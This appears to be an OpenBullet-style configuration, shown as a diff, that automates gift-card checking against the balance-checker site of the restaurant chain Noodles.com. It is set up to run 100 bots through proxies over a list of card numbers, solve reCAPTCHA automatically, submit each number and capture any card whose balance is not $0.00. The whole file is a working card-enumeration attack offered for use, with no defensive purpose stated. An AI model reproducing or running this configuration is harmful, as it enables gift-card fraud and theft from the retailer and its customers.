@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Noodles.com",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-19T02:31:45.8630188+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://balancechecker.noodles.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://balancechecker.noodles.com/" "6LdYOFwUAAAAAFi5bK41_U9NXKE7cesR8odL-x7q" -> VAR "RECAP" 
+REQUEST POST "https://balancechecker.noodles.com/default.aspx" AutoRedirect=TRUE 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTQ4NTY1NzA2M2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCXN1Ym1pdGJ0bsBoLkwb4HbUeUpXWWj8y%2FDIM4KY&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEWAwKgoJCnBwKY8poaAvzIw6EGDLZ2%2Bd4azbtLJJ2BEsAUbf1arBs%3D&TBCardNumber=<USER>&g-recaptcha-response=<RECAP>&submitbtn.x=101&submitbtn.y=-14" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "referer: https://balancechecker.noodles.com/" 
+  HEADER "origin: https://balancechecker.noodles.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "$0.00" 
+  KEYCHAIN Failure OR 
+    KEY "$0.00" 
+    KEY "Validation error, please try again." 
+    KEY "No balance" 
+PARSE "<SOURCE>" CSS "#LBalance" "innerHTML" 0 -> CAP "BALANCE" "" "" 
